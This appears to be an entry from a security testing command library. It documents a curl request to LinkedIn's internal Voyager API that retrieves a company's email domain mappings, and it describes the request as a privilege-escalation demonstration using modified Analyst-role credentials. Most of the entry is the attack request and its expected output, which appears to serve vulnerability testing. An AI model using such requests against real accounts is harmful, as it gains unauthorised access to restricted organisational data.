---
id: cmd-uuid-001
data: >-
  curl -X GET
  "https://www.linkedin.com/voyager/api/voyagerOrganizationDashEmailDomainMappings?decorationId=com.linkedin.voyager.dash.deco.organization.FullOrganizationEmailDomainMapping-2&company=urn%3Ali%3Afsd_company%3A81541206&count=100&q=organization&start=0"
  -H "Cookie: REDACTED" -H "Csrf-Token: REDACTED" -H "Accept:
  application/vnd.linkedin.normalized+json+2.1" -H "User-Agent: Mozilla/5.0
  (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0" -H
  "Referer: https://www.linkedin.com/company/81541206/admin/manage-admins/"
tags:
  - api
  - privilege-escalation
  - recon
type: command
output: JSON response with email domain mappings
executor: curl
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.478Z'
verified: false
validated: true
submitted: true
---
# voyager-api-get-email-domains

## Command

```bash
curl -X GET "https://www.linkedin.com/voyager/api/voyagerOrganizationDashEmailDomainMappings?decorationId=com.linkedin.voyager.dash.deco.organization.FullOrganizationEmailDomainMapping-2&company=urn%3Ali%3Afsd_company%3A81541206&count=100&q=organization&start=0" \
  -H "Cookie: REDACTED" \
  -H "Csrf-Token: REDACTED" \
  -H "Accept: application/vnd.linkedin.normalized+json+2.1" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0" \
  -H "Referer: https://www.linkedin.com/company/81541206/admin/manage-admins/"
```

## Description

This curl command sends a GET request to LinkedIn's Voyager API to fetch organization email domain mappings. Use with modified Analyst credentials to demonstrate privilege escalation by accessing data restricted to higher roles.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `decorationId` | Specifies response format (com.linkedin.voyager.dash.deco.organization.FullOrganizationEmailDomainMapping-2) | Yes |
| `company` | URN of target company (e.g., urn%3Ali%3Afsd_company%3A81541206) | Yes |
| `count` | Number of results (100) | Yes |
| `q` | Query type (organization) | Yes |
| `start` | Pagination start (0) | Yes |
| `Cookie` | Session authentication cookies | Yes |
| `Csrf-Token` | CSRF protection token | Yes |
| `Accept` | Response format (application/vnd.linkedin.normalized+json+2.1) | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.linkedin.com/voyager/api/voyagerOrganizationDashEmailDomainMappings?decorationId=com.linkedin.voyager.dash.deco.organization.FullOrganizationEmailDomainMapping-2&company=urn%3Ali%3Afsd_company%3A81541206&count=100&q=organization&start=0" -H "Cookie: REDACTED" -H "Csrf-Token: REDACTED"
```

### Advanced Usage

Add verbose output and save response:

```bash
curl -v -X GET "https://www.linkedin.com/voyager/api/voyagerOrganizationDashEmailDomainMappings?..." -H "Cookie: REDACTED" -H "Csrf-Token: REDACTED" -o response.json
```

## Expected Output

HTTP/2 200 OK followed by JSON like {"elements": [{"domain": "@company.com", "status": "approved"}], "paging": {...}}, disclosing sensitive domains even with Analyst creds.

## Related

- [[Related Procedure: Modify-Request-for-Analyst-Privileges]]
